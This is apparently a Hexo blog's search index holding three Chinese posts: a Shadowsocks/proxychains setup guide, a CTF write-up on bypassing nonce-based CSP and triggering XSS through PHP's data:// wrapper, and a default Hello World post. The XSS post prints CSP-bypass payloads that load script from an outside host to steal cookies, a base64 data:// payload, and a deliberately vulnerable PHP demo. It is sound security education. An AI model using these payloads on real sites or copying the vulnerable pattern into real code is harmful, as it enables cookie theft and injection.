<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[在linux下配置shadowsocks服务端&客户端]]></title>
    <url>%2F2018%2F12%2F09%2Fss%2F</url>
    <content type="text"><![CDATA[Shadowsocks可以指：一种基于Socks5代理方式的加密传输协议，也可以指实现这个协议的各种开发包。目前包使用Python、C、C++、C#、Go语言等编程语言开发，大部分主要实现（iOS平台的除外）采用Apache许可证、GPL、MIT许可证等多种自由软件许可协议开放源代码。Shadowsocks分为服务器端和客户端，在使用之前，需要先将服务器端部署到服务器上面，然后通过客户端连接并创建本地代理。在中国大陆，本工具也被广泛用于突破防火长城（GFW），以浏览被封锁、遮蔽或干扰的内容。2015年8月22日，Shadowsocks原作者Clowwindy称受到了中国政府的压力，宣布停止维护此计划（项目）并移除其个人页面所存储的源代码。shadowsocks的github 在linux[ubuntu,debin]下配置shadowsocks: 安装12sudo apt-get install python-pippip install shadowsocks 服务端配置开启服务ssserver -p 443 -k password -m aes-256-cfb 后台运行sudo ssserver -p 443 -k password -m rc4-md5 --user nobody -d start 停止sudo ssserver -d stop 检查日志sudo less /var/log/shadowsocks.log 使用json配置文件配置服务虽然这样子可以开启服务，但是在该终端关闭后，进程也会被kill因此，还是推荐通过配置文件/etc/shadowsocks.json启动123ssserver -c /etc/shadowsocks.json -d startssserver -c /etc/shadowsocks.json -d stopssserver -c /etc/shadowsocks.json -d restart 具体配置文件的格式请看下面，需要注意的是IP地址写的都应该是要作为服务器的IP,并且客户端和服务端的配置文件/etc/shadowsocks.json中的其他参数都要一致。 客户端配置创建配置文件/etc/shadowsocks.json Example:12345678910&#123; "server":"my_server_ip", "server_port":8388, "local_address": "127.0.0.1", "local_port":1080, "password":"mypassword", "timeout":300, "method":"aes-256-cfb", "fast_open": false&#125; 启动shadowsocks:sudo sslocal -c /etc/shadowsocks.json -d start 配置代理：参考：http://www.myhack58.com/Article/60/63/2017/82591.htm需要修改/etc/proxychains.conf文件，添加相对应的配置sock5的端口为1080，这里的端口是你之前设置的那个json文件里面的local_port，对应即可 还要把dynamic_chain前面的注释符去掉 接着输入proxyresolv www.google.com试试看，可能会报错，添加以下路径：cp /usr/lib/proxychains3/proxyresolv /usr/bin/ 最后在需要使用代理的终端命令或者浏览器前面加上proxychains即可，比如1proxychains firefox 在最新版的kali安装ss可能会遇到报错的问题，解决方案参考【使用gedit打开】Kali2.0 update到最新版本后安装shadowsocks服务报错问题]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>shadowsocks</tag>
        <tag>vpn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS--CSP绕过【firefox和chrome】和data://协议的使用]]></title>
    <url>%2F2018%2F12%2F08%2Fxss-1%2F</url>
    <content type="text"><![CDATA[最近做一道关于XSS的CTF题目，用到了data://协议触发XSS，并且需要绕过带nonce的CSP策略。由于题目环境没有了，这里主要总结一下其中用到的一些技巧。 CSP绕过在绕过csp策略的时候，找到了以下这篇文章https://www.jianshu.com/p/f1de775bc43e 由于使用了CSP策略，一般想要获取cookie的方法，主要是使用以下几种跳转语句。 对于带有nonce的CSP策略，要执行跳转语句可以使用这种方式绕过，但是由于Chrome和Firefox对于标签的补齐和解析使用了不一样的方式，因此这个绕过的payload有些不一样。 在firefox上可以直接使用上述的payload，只要把跳转语句写入 src 指向的文件//14.rs就可以了，因为属性 a 后面的 &quot; 会被优先解析，这样就会把里面的&lt;/p&gt; &lt;script id=解析成字符串，从而成功引入了带有nonce的script，从而成功执行src里的内容。 Chrome对于标签的解析方式则不同，虽然它也是这样补齐了标签，但是解析的时候仍然会优先解析&quot;里的script，导致发生错误，无法实现xss。在这种情况下，只需要使用Chrome解析html5 的属性的一种特性——浏览器只会解析同一个标签内的第一个属性，对于后面的同名属性，会自动忽略掉。因此，只要改一下payload： 12345&lt;script src=//14.rs a="test" a=" //这样会把后面 a="&lt;/p&gt;&lt;script id="给直接忽略掉或者&lt;script src=//14.rs src="//把src后面的内容直接忽略 由此可以成功引入带有nonce的&lt;script&gt;标签，成功执行XSS。 data://协议使用在XSS的时候，可能常常会用到php伪协议的辅助，比如这样两种情况： 对于提交的内容，通过htmlspecialchars()函数来转义特殊字符，然后保存到某个文件里，之后通过文件包含，把文件的内容输出到某个html标签之间。 对于提交的内容，通过htmlspecialchars()函数来转义特殊字符，然后把内容在某个HTML标签内输出出来。 在这种情况下，怎么去触发XSS呢？这个时候，可以考虑使用data://这个协议：只要把红框中的内容修改成&lt;script&gt;alert(1)&lt;script&gt;的base64编码JTNDc2NyaXB0JTNFYWxlcnQlMjgxJTI5JTNDL3NjcmlwdCUzRQ==就可以触发xss了。 实例使用php实现一个简单的笔记上传保存到文件里，并显示到网页的功能：getnote.php:1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;dataXSS&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action="upnote.php" method="post"&gt; &lt;p&gt;note:&lt;/p&gt; &lt;input type="text" name="note" &gt; &lt;input type="submit" name="submit"&gt;&lt;/form&gt;&lt;?php$url = $_GET['url'];echo "&lt;p&gt;your input url:&lt;/p&gt;"."&lt;p&gt;".urldecode(file_get_contents($url)) ."&lt;/p&gt;";?&gt;&lt;/body&gt;&lt;/html&gt; upnote.php1234&lt;?phpfile_put_contents('url.txt',htmlspecialchars($_POST[note]));header('location:getnote.php?url=url.txt');?&gt; 程序的逻辑很简单，不多介绍。首先我们访问：getnote.php，把笔记的内容写成&lt;script&gt;alert(1)&lt;/script&gt;，然后提交： 没有发生弹框，检查元素可以发现&lt;,&gt;都被htmlspecialchars()转义了，看一下文件内容发现也被转义了，如下图： 这个时候，我们发现读取url的函数使用的是file_get_contents($url)，因此可以使用data://协议，构造下面的payload:1getnote.php?url=data://text/plain;base64,JTNDc2NyaXB0JTNFYWxlcnQlMjgxJTI5JTNDL3NjcmlwdCUzRQ== 访问，发现弹框了。]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>xss</tag>
        <tag>CSP</tag>
        <tag>data://</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F12%2F08%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>hexo，next</tag>
      </tags>
  </entry>
</search>
